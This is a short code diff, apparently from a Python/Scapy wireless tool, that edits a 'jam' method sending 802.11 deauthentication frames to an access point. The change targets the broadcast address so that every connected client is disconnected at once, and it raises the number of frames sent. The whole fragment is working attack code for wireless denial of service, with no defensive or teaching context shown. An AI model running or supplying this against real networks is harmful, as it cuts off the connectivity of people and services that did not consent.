@@ -14,5 +14,5 @@ class AccessPoint():
 
 	def jam(self, interface):
 		logging.info('De-Authenticating All Clients on ' + self.essid)
-		DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = self.bssid, addr3 = self.bssid)/Dot11Deauth(reason=2)
-		sendp(DeAuth_Frame, verbose=False, count=2, iface=interface)
+		DeAuth_Frame = RadioTap()/Dot11(addr1 = "FF:FF:FF:FF:FF:FF", addr2 = self.bssid, addr3 = self.bssid)/Dot11Deauth()
+		sendp(DeAuth_Frame, verbose=False, count=5, iface=interface)
